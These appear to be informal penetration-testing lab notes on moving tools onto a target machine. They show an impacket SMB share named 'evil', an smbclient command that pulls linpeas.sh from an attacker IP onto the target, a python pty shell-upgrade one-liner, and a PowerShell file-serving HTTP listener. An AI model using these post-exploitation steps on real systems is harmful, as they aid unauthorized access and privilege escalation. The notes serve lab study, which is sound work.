  

when use http get linpeas, http server not working , no idea why, so build smb server:

```PowerShell
smbserver.py -smb2support evil $PWD # build a smb server name evil at local
```

```PowerShell
cd /tmp
smbclient //192.168.45.170/evil -U guest -c "get linpeas.sh"
smbclient //192.168.45.170/evil -U guest -c "get linpeas.sh"
```

```PowerShell
python -c 'import pty;pty.spawn("/bin/bash")'
```

use pwsh create http

```Bash
$folder = Get-Location
$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add("http://localhost:8080/")
$listener.Start()
Write-Host "Serving files from $folder at http://localhost:8080"

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $requestPath = $context.Request.Url.AbsolutePath.TrimStart("/")
    $filePath = Join-Path $folder $requestPath

    if (Test-Path $filePath) {
        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        $context.Response.ContentLength64 = $bytes.Length
        $context.Response.OutputStream.Write($bytes, 0, $bytes.Length)
    } else {
        $error = [System.Text.Encoding]::UTF8.GetBytes("404 Not Found")
        $context.Response.StatusCode = 404
        $context.Response.OutputStream.Write($error, 0, $error.Length)
    }

    $context.Response.OutputStream.Close()
}
```